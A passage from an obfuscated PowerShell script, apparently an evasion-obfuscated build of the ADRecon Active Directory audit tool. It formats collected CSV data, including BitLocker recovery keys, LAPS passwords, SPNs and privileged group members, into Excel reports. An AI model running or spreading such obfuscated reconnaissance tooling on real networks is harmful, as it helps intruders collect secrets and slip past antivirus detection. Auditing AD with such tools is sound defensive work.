            ${w`O`RkbOoK}."W`OrksH`eETS".("{0}{1}" -f'Ite','m').Invoke(1)."hyp`ERlIN`KS".("{0}{1}" -f'Ad','d').Invoke(${WOr`kBOOk}."workshE`e`Ts".("{0}{1}"-f 'I','tem').Invoke(1)."CEL`ls".("{0}{1}"-f 'I','tem').Invoke(1,5) , ("{15}{2}{7}{21}{1}{6}{10}{5}{13}{11}{4}{14}{9}{17}{19}{20}{8}{18}{3}{22}{12}{0}{16}"-f 'pci_','w.pcise','tps:','um','t_l','s','c','/','o','b','urity','umen','=','tandards.org/doc','i','ht','dss','rary?c','ry=pcidss&doc','ate','g','/ww','ent'), "" , "", ("{1}{3}{0}{4}{2}" -f 'ir','PCI DSS ','nt','Requ','eme')) | &("{2}{0}{1}"-f 'ut-N','ull','O')
            ${WO`RK`BoOK}."WO`Rk`SHEetS".("{1}{0}"-f 'tem','I').Invoke(1)."HyPERlI`N`KS".("{0}{1}"-f 'Ad','d').Invoke(${WORkB`O`oK}."w`o`RkSHeETs".("{1}{0}" -f'em','It').Invoke(1)."ce`Lls".("{0}{1}"-f'It','em').Invoke(1, 7) , ("{7}{2}{0}{6}{3}{8}{1}{5}{4}" -f'/','ew-al','/','.gov.au/','ent/ism','l-cont','www.cyber','https:','acsc/vi'), "" , "", ("{1}{4}{2}{3}{0}" -f'22','IS','o','ls 16Jun20','M Contr')) | &("{1}{0}{2}"-f 't-N','Ou','ull')
            ${woRk`BoOK}."w`orKSheE`Ts".("{1}{0}" -f 'm','Ite').Invoke(1)."H`yper`LinkS".("{0}{1}"-f 'Ad','d').Invoke(${WORkB`O`OK}."WO`R`kSh`EETs".("{0}{1}" -f'It','em').Invoke(1)."cEL`lS".("{1}{0}" -f'em','It').Invoke(1,8) , ("{7}{1}{8}{2}{9}{4}{5}{10}{0}{3}{6}"-f'r','.c','secur','ve','ty.org/benchmark/micro','sof','r/','https://www','i','i','t_windows_se'), "" , "", ("{0}{4}{1}{3}{2}" -f 'CIS Be','mark 2','22','0','nch')) | &("{0}{1}"-f 'Out-N','ull')

            ${e`xcel}."SC`R`e`EnupdaTi`NG" = ${t`RuE}
            &("{0}{3}{4}{6}{2}{1}{7}{5}"-f 'Get-ADRExcelCo','le','e','m','Ob','e','jR','as') -ComObjtoRelease ${WOrK`s`heeT}
            &("{2}{1}{0}"-f'ble','emove-Varia','R') ("{1}{0}{2}"-f 'orks','w','heet')
        }

        ${A`DFiLE`NA`Me} = -join(${rEPOr`T`P`ATh},'\',("{0}{1}{4}{3}{5}{2}"-f 'DomainCon','t','v','llers','ro','.cs'))
        If (&("{3}{2}{1}{0}"-f'th','a','t-P','Tes') ${AD`FILE`NAmE})
        {
            &("{2}{4}{3}{0}{1}{5}" -f'ADR','ExcelWork','G','t-','e','book') -Name ("{1}{5}{4}{2}{3}{0}"-f'ers','Dom','Contr','oll',' ','ain')
            &("{5}{1}{0}{2}{3}{4}"-f'celImp','t-ADREx','o','r','t','Ge') -ADFileName ${adfI`lE`NAMe}
            &("{0}{2}{1}{3}"-f'R','e-Vari','emov','able') ("{3}{0}{2}{1}"-f'l','Name','e','ADFi')
        }

        ${ADf`I`leNaMe} = -join(${Re`Por`TP`Ath},'\',("{4}{1}{0}{2}{3}" -f'nge','upCha','s.','csv','Gro'))
        If (&("{0}{2}{1}"-f 'Test','h','-Pat') ${ADfIlE`NA`me})
        {
            &("{2}{5}{3}{0}{1}{4}" -f'rkb','o','Get-ADR','Wo','ok','Excel') -Name ("{1}{2}{0}{3}"-f'up Ch','G','ro','anges')
            &("{2}{3}{0}{1}"-f'e','lImport','Ge','t-ADRExc') -ADFileName ${a`df`iLe`NamE}
            &("{2}{1}{0}" -f'ble','Varia','Remove-') ("{0}{1}{2}" -f 'ADFi','leNam','e')

            &("{4}{3}{1}{0}{2}" -f 'So','xcel','rt','ADRE','Get-') -ColumnName ("{0}{2}{1}"-f 'Gro','Name','up ')
        }

        ${ADFI`Le`NAMe} = -join(${Rep`O`RtPaTh},'\',("{2}{3}{1}{0}" -f's.csv','L','DA','C'))
        If (&("{3}{2}{0}{1}"-f 'P','ath','st-','Te') ${A`dfi`LEn`AMe})
        {
            &("{4}{1}{2}{5}{3}{0}" -f 'k','x','c','lWorkboo','Get-ADRE','e') -Name ("{0}{1}" -f'D','ACLs')
            &("{4}{1}{3}{2}{0}" -f 'lImport','et-AD','Exce','R','G') -ADFileName ${A`d`FiLeN`AMe}
            &("{2}{1}{0}" -f've-Variable','o','Rem') ("{1}{2}{0}"-f'Name','A','DFile')
        }

        ${ad`FIlE`N`AmE} = -join(${rEp`oR`TP`ATH},'\',("{2}{0}{1}" -f 'CLs.cs','v','SA'))
        If (&("{3}{0}{2}{1}"-f's','Path','t-','Te') ${ad`FiL`Ename})
        {
            &("{5}{0}{1}{4}{2}{3}" -f't-ADRE','xc','oo','k','elWorkb','Ge') -Name ("{1}{0}" -f'Ls','SAC')
            &("{2}{1}{3}{5}{4}{0}" -f'rt','-ADR','Get','ExcelI','o','mp') -ADFileName ${adFiL`e`NAMe}
            &("{3}{0}{2}{4}{1}"-f 'a','able','r','Remove-V','i') ("{1}{0}{3}{2}" -f'i','ADF','Name','le')
        }

        ${ad`Fil`e`NAME} = -join(${r`e`pO`RTPAtH},'\',("{1}{2}{0}"-f'sv','GP','Os.c'))
        If (&("{2}{1}{0}"-f'th','-Pa','Test') ${aDF`I`len`AMe})
        {
            &("{3}{1}{2}{0}{4}{5}"-f 'ADRExcelWorkbo','e','t-','G','o','k') -Name ("{0}{1}"-f 'G','POs')
            &("{2}{0}{4}{3}{1}" -f'et','port','G','RExcelIm','-AD') -ADFileName ${ADFiLe`Na`ME}
            &("{4}{3}{1}{0}{2}"-f 'abl','i','e','r','Remove-Va') ("{2}{3}{0}{1}"-f'N','ame','A','DFile')
        }

        ${A`DFiLE`N`AmE} = -join(${REPO`R`TpA`TH},'\',("{1}{0}{3}{2}" -f'PLi','g','s.csv','nk'))
        If (&("{2}{1}{0}" -f 't-Path','s','Te') ${AD`F`iLeNaMe})
        {
            &("{5}{1}{0}{2}{3}{4}"-f 'DR','et-A','Ex','celWorkbo','ok','G') -Name ("{0}{1}" -f'gPLink','s')
            &("{0}{1}{2}{4}{3}" -f'Get-AD','RE','xce','Import','l') -ADFileName ${aDfil`EN`AMe}
            &("{4}{2}{0}{3}{1}" -f'V','e','-','ariabl','Remove') ("{1}{0}{2}"-f'leNa','ADFi','me')
        }

        ${a`DF`ilEn`Ame} = -join(${RE`pO`RtpA`Th},'\',("{1}{2}{0}" -f 'es','DNSNo','d'),("{1}{0}"-f 'csv','.'))
        If (&("{0}{2}{3}{1}" -f 'Tes','h','t','-Pat') ${ad`FilEN`Ame})
        {
            &("{2}{1}{0}{4}{3}{5}" -f'E','-ADR','Get','rk','xcelWo','book') -Name ("{2}{1}{0}{3}" -f 'R',' ','DNS','ecords')
            &("{2}{1}{0}{4}{3}{5}"-f 'x','RE','Get-AD','lIm','ce','port') -ADFileName ${ADf`i`Le`NamE}
            &("{1}{3}{0}{2}"-f've-Var','R','iable','emo') ("{1}{2}{3}{0}" -f'leName','A','DF','i')
        }

        ${A`DFIlE`NA`ME} = -join(${REP`oR`TpaTh},'\',("{0}{2}{1}" -f'DNS','csv','Zones.'))
        If (&("{1}{0}"-f'st-Path','Te') ${ADFI`L`eNaME})
        {
            &("{4}{3}{2}{0}{1}" -f'o','ok','lWorkb','xce','Get-ADRE') -Name ("{2}{0}{1}" -f' Zone','s','DNS')
            &("{3}{1}{0}{2}{4}{5}"-f 'xce','-ADRE','l','Get','I','mport') -ADFileName ${a`d`FIlen`AME}
            &("{3}{4}{1}{2}{0}"-f 'iable','e','-Var','Re','mov') ("{1}{0}{2}" -f'leN','ADFi','ame')
        }

        ${adFi`L`ename} = -join(${r`ePo`Rtp`ATh},'\',("{1}{2}{0}"-f'sv','Prin','ters.c'))
        If (&("{0}{2}{1}" -f 'T','t-Path','es') ${A`d`FILen`Ame})
        {
            &("{3}{2}{1}{0}"-f'ook','orkb','xcelW','Get-ADRE') -Name ("{1}{2}{0}"-f 's','Pri','nter')
            &("{4}{2}{3}{1}{0}"-f'port','Im','e','l','Get-ADRExc') -ADFileName ${AdF`Ilen`AmE}
            &("{2}{1}{0}{3}"-f'ariab','e-V','Remov','le') ("{1}{0}{2}{3}"-f'il','ADF','eNam','e')
        }

        ${Adf`i`lenAmE} = -join(${rEPO`RTP`Ath},'\',("{2}{3}{4}{6}{0}{5}{1}"-f 's.c','v','Bit','LockerRec','ove','s','ryKey'))
        If (&("{0}{2}{1}"-f'T','t-Path','es') ${A`Df`I`LEnaME})
        {
            &("{0}{3}{2}{1}{4}" -f 'Ge','lWo','e','t-ADRExc','rkbook') -Name ("{0}{2}{1}"-f 'BitLo','r','cke')
            &("{2}{0}{3}{1}"-f'Impo','t','Get-ADRExcel','r') -ADFileName ${Ad`Fi`Le`NamE}
            &("{3}{2}{1}{4}{0}"-f'ble','e-Var','mov','Re','ia') ("{0}{1}{2}"-f 'AD','Fil','eName')
        }

        ${ADfIlE`Na`Me} = -join(${RE`po`RTPa`Th},'\',("{0}{2}{1}" -f 'LAP','sv','S.c'))
        If (&("{2}{1}{0}" -f 'Path','est-','T') ${adfI`LeN`AME})
        {
            &("{1}{0}{2}{4}{3}" -f 'AD','Get-','RExcelW','ook','orkb') -Name ("{0}{1}"-f'LAP','S')
            &("{1}{0}{3}{4}{2}"-f 'A','Get-','rt','D','RExcelImpo') -ADFileName ${A`DF`iLenA`me}
            &("{3}{0}{1}{2}"-f'ove-V','ariab','le','Rem') ("{3}{1}{2}{0}"-f'e','ileN','am','ADF')
        }

        ${aDF`i`l`eNAme} = -join(${repOR`TPa`Th},'\',("{4}{2}{1}{3}{0}" -f'sv','SPNs.','r','c','Compute'))
        If (&("{0}{2}{1}" -f 'Te','th','st-Pa') ${AdFI`l`E`NAMe})
        {
            &("{3}{2}{0}{1}" -f 'lWor','kbook','et-ADRExce','G') -Name ("{2}{0}{3}{1}"-f'ute','s','Comp','r SPN')
            &("{1}{2}{4}{3}{0}{5}" -f'po','Get-ADR','E','elIm','xc','rt') -ADFileName ${aDfiLE`N`AMe}
            &("{0}{1}{4}{2}{3}"-f 'Remove-V','a','abl','e','ri') ("{0}{1}{2}"-f 'ADFi','leN','ame')

            &("{2}{3}{0}{1}"-f 'lS','ort','Get-ADREx','ce') -ColumnName ("{2}{0}{1}" -f'erNa','me','Us')
        }

        ${A`dFileNa`mE} = -join(${Re`PoR`Tp`ATH},'\',("{0}{3}{2}{1}"-f'Co','v','ers.cs','mput'))
        If (&("{0}{1}{2}" -f'T','est-P','ath') ${aD`Fil`enaMe})
        {
            &("{4}{0}{5}{3}{2}{1}" -f 'et','book','Work','ADRExcel','G','-') -Name ("{1}{0}{2}" -f'mputer','Co','s')
            &("{3}{0}{1}{2}"-f 'xce','lImpo','rt','Get-ADRE') -ADFileName ${a`DFIleNa`ME}
            &("{2}{3}{1}{4}{0}"-f 'e','a','R','emove-Vari','bl') ("{0}{1}{3}{2}"-f'A','DFil','Name','e')

            &("{3}{1}{2}{0}" -f't','et-ADRExcel','Sor','G') -ColumnName ("{0}{2}{1}"-f 'Use','me','rNa')

            ${WoRks`h`e`eT} = ${wO`RkbooK}."w`O`Rkshe`EtS".("{1}{0}"-f'm','Ite').Invoke(1)
            
            ${wOr`KSh`EET}.("{1}{2}{0}" -f 'ct','S','ele').Invoke()
            ${Wo`RKSh`EeT}."apPLi`CA`TION"."a`CTive`w`INdow"."SP`lITc`oLUMN" = 1
            ${WoR`K`shEet}."APplIcA`T`ioN"."Ac`Ti`VEWInd`ow"."s`pLitrow" = 1
            ${WOr`Ks`HeeT}."A`P`plica`TIOn"."A`Ct`iveWI`NDOW"."fRe`e`ZEPANeS" = ${Tr`UE}

            &("{1}{5}{4}{6}{0}{2}{3}"-f'le','Get-','a','se','lComObj','ADRExce','Re') -ComObjtoRelease ${wOR`KSh`eET}
            &("{2}{0}{4}{3}{1}"-f'ri','e','Remove-Va','l','ab') ("{2}{1}{0}"-f 'heet','orks','w')
        }

        ${aDf`ilEn`AME} = -join(${r`e`POrtPath},'\',("{0}{1}" -f'OUs.','csv'))
        If (&("{0}{1}" -f 'Tes','t-Path') ${ad`F`i`lenaME})
        {
            &("{5}{2}{1}{3}{4}{0}"-f 'kbook','DRE','t-A','xce','lWor','Ge') -Name "OUs"
            &("{3}{5}{4}{1}{2}{0}" -f'port','lI','m','Get-','DRExce','A') -ADFileName ${ADfI`L`en`AmE}
            &("{2}{1}{3}{0}" -f'ble','move-','Re','Varia') ("{2}{0}{1}{3}"-f'DFil','eN','A','ame')
        }

        ${a`dFIL`ENAmE} = -join(${RePoRt`PA`TH},'\',("{1}{2}{0}" -f 'ups.csv','G','ro'))
        If (&("{0}{2}{1}"-f 'T','-Path','est') ${A`DFile`Name})
        {
            &("{4}{2}{0}{3}{5}{1}" -f'E','book','R','xc','Get-AD','elWork') -Name ("{1}{0}" -f's','Group')
            &("{3}{0}{4}{1}{2}"-f 'ADREx','elImp','ort','Get-','c') -ADFileName ${adfil`e`NAME}
            &("{3}{0}{1}{2}" -f'V','ariabl','e','Remove-') ("{1}{2}{3}{0}"-f'e','ADFil','eNa','m')

            &("{1}{0}{4}{3}{2}"-f '-AD','Get','celSort','Ex','R') -ColumnName ("{1}{2}{0}{4}{3}" -f't','Di','s','uishedName','ing')
        }

        ${A`DfI`lENAme} = -join(${R`EP`Ortpa`Th},'\',("{1}{2}{0}" -f'pMembers.csv','Gr','ou'))
        If (&("{1}{2}{0}" -f'h','Test-','Pat') ${ADFiL`enA`mE})
        {
            &("{6}{4}{2}{0}{1}{3}{5}"-f'x','ce','E','l','t-ADR','Workbook','Ge') -Name ("{0}{3}{1}{2}"-f 'Gro',' Member','s','up')
            &("{2}{1}{0}{3}{4}"-f 'ADR','et-','G','ExcelImpo','rt') -ADFileName ${adFIle`N`A`me}
            &("{0}{2}{1}"-f 'Remove','e','-Variabl') ("{0}{2}{1}"-f'A','me','DFileNa')

            &("{0}{2}{4}{1}{3}" -f'Get-','elSo','ADR','rt','Exc') -ColumnName ("{0}{1}{2}"-f 'Gro','up Nam','e')
        }

        ${AdfiL`e`NAmE} = -join(${RE`PorTP`ATh},'\',("{1}{0}{3}{2}"-f 'rSPNs','Use','csv','.'))
        If (&("{0}{1}" -f'Te','st-Path') ${A`dF`IlEN`AME})
        {
            &("{2}{4}{0}{3}{1}" -f'cel','book','Get-','Work','ADREx') -Name ("{1}{2}{0}" -f'er SPNs','U','s')
            &("{1}{0}{4}{3}{2}"-f 'et-','G','t','elImpor','ADRExc') -ADFileName ${ADF`I`lEname}
            &("{3}{0}{2}{1}" -f'e','ove-Variable','m','R') ("{0}{2}{1}" -f'ADFi','me','leNa')
        }

        ${A`d`FilENamE} = -join(${reP`ORtPa`TH},'\',("{2}{1}{0}"-f'.csv','sers','U'))
        If (&("{1}{0}{2}" -f 'est-P','T','ath') ${ADFIleN`A`me})
        {
            &("{1}{2}{0}{3}{4}{5}"-f 'E','Get','-ADR','xc','elWorkboo','k') -Name ("{0}{1}"-f'Use','rs')
            &("{0}{1}{2}{3}{5}{4}" -f'Get','-AD','R','ExcelI','rt','mpo') -ADFileName ${adFI`Le`Na`Me}
            &("{3}{0}{1}{2}{4}"-f'-Vari','a','b','Remove','le') ("{2}{0}{1}" -f 'eN','ame','ADFil')

            &("{2}{3}{0}{1}" -f '-ADRExc','elSort','G','et') -ColumnName ("{1}{0}"-f 'me','UserNa')

            ${wo`RkS`HeEt} = ${Wo`R`kb`Ook}."WORKSHE`e`Ts".("{0}{1}"-f 'I','tem').Invoke(1)

            
            ${woRksH`E`et}.("{0}{2}{1}" -f 'Se','ct','le').Invoke()
            ${Wo`RK`S`HEeT}."A`ppLI`catioN"."AcTiv`ewiN`DOW"."sp`liTCo`lUmN" = 1
            ${w`OR`kSheEt}."Ap`pl`IC`AtiON"."A`C`TivEwInD`ow"."s`plI`TROw" = 1
            ${W`O`RKsHeEt}."a`ppl`iCaTION"."aCTIVeW`I`NDOw"."fREEZ`epaN`Es" = ${Tr`Ue}

            ${W`orK`sHE`eT}."CeL`lS".("{0}{1}"-f 'Ite','m').Invoke(1,3)."iNtErI`OR"."c`OlO`R`iNdex" = 5
            ${wORK`ShE`ET}."C`ELLS".("{1}{0}"-f'tem','I').Invoke(1,3)."f`ONt"."c`O`lOrIN`DEX" = 2
            
            ${wO`RkSHe`ET}."USEDR`An`GE".("{0}{1}"-f 'Sele','ct').Invoke() | &("{1}{0}{2}"-f 'ul','Out-N','l')
            ${EX`c`el}."sele`Cti`On".("{0}{1}{2}"-f'Auto','Fil','ter').Invoke(3,${tr`UE}) | &("{0}{2}{1}"-f'O','ll','ut-Nu')
            ${WOR`K`shE`Et}."C`EllS".("{0}{1}"-f 'Ite','m').Invoke(1,1).("{1}{2}{0}" -f 'lect','S','e').Invoke() | &("{0}{1}" -f'Ou','t-Null')
            &("{2}{0}{7}{5}{4}{1}{6}{3}"-f 'REx','e','Get-AD','se','jRel','Ob','a','celCom') -ComObjtoRelease ${woRksh`e`et}
            &("{2}{3}{1}{0}" -f'e','iabl','Re','move-Var') ("{1}{2}{0}"-f 't','works','hee')
        }

        
        ${AD`FilE`NA`mE} = -join(${re`p`or`TPaTh},'\',("{1}{2}{3}{0}" -f'v','C','omputerS','PNs.cs'))
        If (&("{1}{2}{0}"-f't-Path','Te','s') ${Ad`FiL`enamE})
        {
            &("{3}{4}{1}{0}{2}{5}"-f'r','xcelWo','kbo','Get-A','DRE','ok') -Name ("{2}{3}{0}{1}{4}" -f ' Role St','a','Comput','er','ts')
            &("{1}{0}{3}{4}{2}" -f'-V','Remove','ble','ar','ia') ("{2}{1}{0}"-f 'me','DFileNa','A')

            ${W`Orksh`eet} = ${W`OR`KBOOk}."WorK`sHEE`TS".("{0}{1}" -f 'It','em').Invoke(1)
            ${PIV`OTTabLE`N`AMe} = ("{2}{1}{0}"-f 's','omputer SPN','C')
            &("{6}{3}{5}{4}{0}{1}{2}" -f'ivotTa','b','le','e','ExcelP','t-ADR','G') -SrcSheetName ("{2}{1}{0}"-f'SPNs','mputer ','Co') -PivotTableName ${p`IVoTTAbl`EnAME} -PivotRows @(("{1}{0}{2}" -f 'ervi','S','ce')) -PivotValues @(("{2}{1}{0}"-f 'e','vic','Ser'))

            ${W`ORk`SheET}."C`Ells".("{0}{1}" -f 'Ite','m').Invoke(1,1) = ("{1}{0}{2}{3}" -f'm','Co','puter Ro','le')
            ${WoRKs`he`Et}."ce`lLs".("{0}{1}" -f 'Ite','m').Invoke(1,2) = ("{1}{0}" -f 'unt','Co')

            
            ${W`oRksHe`et}.("{0}{2}{1}{3}"-f'Pi','tTable','vo','s').Invoke(${p`ivOTtaB`L`ena`mE}).("{2}{0}{1}" -f 'ield','s','PivotF').Invoke(("{0}{1}"-f 'Ser','vice'))."AUtO`sO`RT"(  (  cHILDITEm vAriaBLe:7TU6).VALue::"x`LdEscen`dInG",("{1}{0}" -f 't','Coun'))

            &("{1}{2}{3}{0}" -f 't','G','e','t-ADRExcelChar') -ChartType ("{0}{3}{2}{1}{5}{4}"-f'xlC','Clust','n','olum','red','e') -ChartLayout 10 -ChartTitle ("{0}{4}{3}{2}{1}{5}"-f'C','les in','er Ro','t','ompu',' AD') -RangetoCover ("{0}{1}" -f 'D','2:U16')
            ${wOr`KB`OOK}."wOrK`S`h`EeTs".("{1}{0}" -f 'tem','I').Invoke(1)."h`YpERL`IN`Ks".("{0}{1}"-f 'Ad','d').Invoke(${worKB`o`OK}."WorkS`HE`ets".("{1}{0}" -f 'm','Ite').Invoke(1)."cel`lS".("{1}{0}"-f'em','It').Invoke(1,4) , "" , ((("{1}{3}{5}{4}{0}{2}{6}"-f'r ','w5VCom','SPNsw5V','p','te','u','!A1'))  -creplAcE'w5V',[ChaR]39), "", ("{0}{1}"-f'Raw ','Data')) | &("{0}{1}"-f 'O','ut-Null')
            ${E`xc`El}."WI`NdOWs".("{0}{1}"-f'It','em').Invoke(1)."disP`LAyg`RIdlINeS" = ${f`A`LsE}
            &("{2}{1}{0}{3}"-f 'V','ve-','Remo','ariable') ("{2}{3}{1}{0}" -f'Name','able','Pi','votT')

            &("{3}{2}{0}{1}{4}" -f'Com','ObjReleas','Excel','Get-ADR','e') -ComObjtoRelease ${wOrks`HE`ET}
            &("{4}{0}{1}{2}{3}"-f 'emove-V','aria','bl','e','R') ("{0}{1}{2}" -f'workshe','e','t')
        }

        
        ${AdF`Ilen`AMe} = -join(${r`E`pOrtpaTh},'\',("{0}{2}{1}{3}" -f 'Com','t','pu','ers.csv'))
        If (&("{0}{1}{3}{2}"-f 'Te','st-P','th','a') ${Ad`FIlEnA`me})
        {
            &("{2}{0}{5}{4}{3}{1}"-f'ADRExc','k','Get-','oo','b','elWork') -Name ("{0}{1}{4}{3}{2}" -f'Operating Syste','m ','ats','t','S')
            &("{2}{1}{3}{4}{0}"-f 'le','e-Va','Remov','r','iab') ("{2}{0}{1}" -f'D','FileName','A')

            ${wor`KSH`e`eT} = ${WO`RKb`O`ok}."wOr`Kshee`Ts".("{0}{1}"-f 'It','em').Invoke(1)
            ${PIv`otta`BlEna`Me} = ("{1}{4}{3}{0}{2}"-f'ting ','Ope','Systems','a','r')
            &("{1}{3}{4}{0}{2}" -f'b','Get-ADRE','le','xcelPivotT','a') -SrcSheetName ("{2}{1}{0}" -f'rs','ompute','C') -PivotTableName ${PiV`OTtabl`eNaMe} -PivotRows @(("{0}{4}{3}{1}{2}" -f 'Oper','ste','m','ting Sy','a')) -PivotValues @(("{2}{0}{4}{3}{1}"-f 'er','tem','Op','s','ating Sy'))

            ${w`Or`KSHEeT}."C`ElLS".("{1}{0}"-f 'm','Ite').Invoke(1,1) = ("{1}{2}{0}"-f'g System','Op','eratin')
            ${Wo`RKS`HEEt}."C`eLlS".("{0}{1}" -f'It','em').Invoke(1,2) = ("{1}{0}" -f'unt','Co')

            
            ${WOR`kS`heET}.("{1}{2}{0}{3}"-f 'e','Pivo','tTabl','s').Invoke(${PIvottAb`LE`N`AmE}).("{0}{1}{2}" -f 'P','ivotF','ields').Invoke(("{1}{2}{0}" -f 'erating System','O','p'))."AU`ToS`oRt"(  (GeT-iTEM ('vAR'+'iaBle'+':7T'+'U6')).VAluE::"X`lDeScEN`Di`Ng",("{1}{0}" -f'unt','Co'))

            &("{0}{2}{3}{1}" -f 'Ge','rt','t-ADRExcel','Cha') -ChartType ("{1}{3}{0}{2}{4}" -f 'o','xl','lumnCluster','C','ed') -ChartLayout 10 -ChartTitle ("{3}{4}{0}{1}{2}" -f 'ing Syste','ms i','n AD','Ope','rat') -RangetoCover ("{1}{0}"-f 'S16','D2:')
            ${WORK`B`OOK}."WoR`Ks`He`eTS".("{0}{1}" -f'It','em').Invoke(1)."hyp`eRlIN`ks".("{0}{1}"-f 'A','dd').Invoke(${W`orKBO`ok}."WOrKs`Hee`TS".("{0}{1}" -f'I','tem').Invoke(1)."cE`LLS".("{1}{0}" -f'tem','I').Invoke(1,4) , "" , ("{0}{2}{1}" -f'Com','ers!A1','put'), "", ("{1}{0}" -f'aw Data','R')) | &("{1}{0}"-f'll','Out-Nu')
            ${EX`C`EL}."wIND`ows".("{1}{0}"-f'em','It').Invoke(1)."DIsP`laYgRIdL`I`N`eS" = ${fA`L`SE}
            &("{4}{3}{2}{0}{1}" -f'l','e','ariab','e-V','Remov') ("{1}{0}{2}{3}{4}"-f'T','Pivot','abl','eNa','me')

            &("{7}{3}{0}{4}{6}{5}{2}{1}" -f '-ADREx','e','eleas','et','celCom','R','Obj','G') -ComObjtoRelease ${wOrKS`H`eeT}
            &("{1}{0}{3}{2}" -f 'emove-Varia','R','le','b') ("{2}{1}{0}" -f 'et','he','works')
        }

        
        ${aD`FIlen`A`ME} = -join(${r`epOrTP`ATH},'\',("{2}{1}{0}{3}" -f 'ers.cs','Memb','Group','v'))
        If (&("{1}{2}{0}" -f 'th','Test-P','a') ${A`dfILeN`Ame})
        {
            &("{0}{5}{4}{3}{2}{1}" -f 'Ge','orkbook','celW','DREx','A','t-') -Name ("{0}{4}{6}{5}{1}{3}{2}"-f'Priv',' Grou','Stats','p ','il','ed','eg')
            &("{3}{0}{1}{2}" -f'r','iab','le','Remove-Va') ("{2}{1}{0}{3}" -f'le','Fi','AD','Name')

            ${W`orkSh`eET} = ${wO`R`Kb`OOK}."w`oRkS`he`ETS".("{0}{1}"-f 'Ite','m').Invoke(1)
            ${pIVotT`A`BLEname} = ("{3}{0}{1}{2}"-f'roup Me','m','bers','G')
            &("{3}{1}{0}{4}{2}"-f 't','et-ADRExcelPivo','ble','G','Ta') -SrcSheetName ("{4}{3}{2}{0}{1}" -f 'e','mbers','M','oup ','Gr') -PivotTableName ${P`I`Vo`TTAbLE`NAME} -PivotRows @(("{0}{1}{2}"-f'Gro','up Na','me'))-PivotFilters @(("{2}{1}{0}"-f'e','ountTyp','Acc')) -PivotValues @(("{1}{2}{3}{0}"-f 'e','Ac','coun','tTyp'))

            
            ${woR`K`ShEet}.("{1}{0}{2}" -f'votTabl','Pi','es').Invoke(${p`IVotT`AbLeN`AMe}).("{2}{0}{1}"-f 'tFiel','ds','Pivo').Invoke(("{0}{2}{1}"-f'A','pe','ccountTy'))."cu`RReNTP`AGe" = ("{1}{0}" -f'r','use')

            ${W`O`RKsHEeT}."cE`LLs".("{1}{0}"-f'em','It').Invoke(1,2)."I`Nter`IoR"."colo`R`InDeX" = 5
            ${wo`R`kSHeeT}."CeL`ls".("{0}{1}"-f'I','tem').Invoke(1,2)."FO`NT"."coL`O`RIndeX" = 2

            ${work`sH`eET}."Cel`Ls".("{0}{1}"-f'I','tem').Invoke(3,1) = ("{0}{1}{2}" -f'Gr','ou','p Name')
            ${Wo`RKSHE`et}."Cel`Ls".("{1}{0}" -f 'em','It').Invoke(3,2) = ("{0}{4}{2}{3}{1}" -f 'Count (Not-Rec',')','s','ive','ur')

            ${Ex`CeL}."s`C`REenuPDat`iNg" = ${f`AL`Se}
            
            ${pIvoTT`A`BletEMP} = (${W`orK`BO`OK}.("{1}{2}{0}" -f'es','Pivo','tCach').Invoke().("{0}{1}" -f 'Ite','m').Invoke(${W`o`RKbOoK}.("{0}{2}{3}{1}"-f'Pi','hes','votC','ac').Invoke()."coU`Nt")).("{3}{0}{1}{2}{4}"-f'v','o','tT','CreatePi','able').Invoke(("{0}{1}"-f'R1','C5'),("{2}{3}{1}{0}" -f 'leTemp','tTab','Pi','vo'))
            ${piV`OTfIE`lDT`E`mp} = ${P`IvOTtaBLeT`E`mp}.("{2}{1}{0}"-f 'ds','otFiel','Piv').Invoke(("{2}{0}{1}"-f'roup',' Name','G'))
            
            ${p`i`VOtF`IeLdtE`mP}."oR`I`en`TaTioN" =   $YDS47::"XlPA`gEFi`ELD"
            Try
            {
                ${Pi`VOTfi`e`LdT`EMP}."CUR`ReNtP`A`gE" = ("{2}{1}{3}{0}" -f 'ins','ain ','Dom','Adm')
            }
            Catch
            {
                
                ${no`dA} = ${t`RUE}
            }
            If (${N`Oda})
            {
                Try
                {
                    ${PIvo`Tfi`e`ldt`Emp}."CURrE`N`TpAGE" = ("{2}{0}{4}{3}{1}" -f'dm','trators','A','nis','i')
                }
                Catch
                {
                    
                }
            }
            
            ${PIv`oTS`LIceR} = ${woRk`B`oOk}."S`lIc`ErcAc`HEs".("{0}{1}"-f'A','dd').Invoke(${PI`VO`TTA`BLE`TEMp},${PIv`OTf`iE`LDT`eMp})
            
            ${P`I`VoTsLicER}."p`I`VottABl`ES".("{0}{1}{2}{3}" -f'AddPi','vo','tTabl','e').Invoke(${W`O`RK`SHEet}.("{3}{1}{0}{2}" -f 'tTa','vo','bles','Pi').Invoke(${pi`VOtTabl`Ena`ME}))
            
            ${P`ivotsl`iCer}.("{0}{1}"-f 'Delet','e').Invoke()
            
            ${pIvOt`TA`Bl`Et`emP}."t`AbL`eRAnG`e2".("{0}{1}" -f'Delet','e').Invoke() | &("{2}{0}{1}"-f 'N','ull','Out-')

            &("{4}{5}{2}{6}{0}{1}{3}{7}"-f 'm','Obj','Exce','Relea','Get-','ADR','lCo','se') -ComObjtoRelease ${pIVo`T`FIE`lDT`eMp}
            &("{4}{1}{5}{0}{3}{2}" -f 'bjRel','Exce','se','ea','Get-ADR','lComO') -ComObjtoRelease ${PivO`TSLi`C`er}
            &("{4}{2}{1}{0}{3}" -f 'bjRe','O','et-ADRExcelCom','lease','G') -ComObjtoRelease ${p`Iv`oTT`ABLeTeMp}

            &("{0}{3}{2}{1}{4}"-f 'Remo','i','ar','ve-V','able') ("{2}{0}{1}"-f'o','tFieldTemp','Piv')
            &("{1}{2}{3}{0}"-f 'e','Rem','ove-Var','iabl') ("{1}{0}{3}{2}" -f'tSli','Pivo','r','ce')
            &("{2}{3}{1}{0}{4}" -f 'ab','ove-Vari','Re','m','le') ("{2}{4}{0}{3}{1}"-f 'tTabl','Temp','Pi','e','vo')

